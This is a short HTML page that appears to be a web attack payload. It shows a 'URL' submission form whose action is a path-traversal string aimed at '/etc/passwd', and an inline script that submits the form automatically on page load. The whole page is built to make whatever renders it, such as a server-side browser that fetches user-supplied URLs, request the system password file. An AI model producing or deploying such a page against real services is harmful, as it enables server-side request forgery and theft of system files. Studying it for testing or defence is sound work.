<html>
  <body>
    <main role="main">
            <div class="container">
                <div class="row">
                    <form class="form-inline" action="/../../../../../../etc/passwd" method="GET" id="form">
                        <div class="input-group">
                            <div class="input-group-prepend">
                                <span class="input-group-text" id="describeUrl">URL</span>
                            </div>
                            <input type="text" class="form-control" id="url" name="url" autocomplete="off" aria-describedby="describeUrl" placeholder="https://google.com">
                            <div class="input-group-append">
                                <button type="submit" class="btn btn-primary">Submit</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
    </main>
    <script>
       document.forms[0].submit();
    </script>
  </body>
</html>
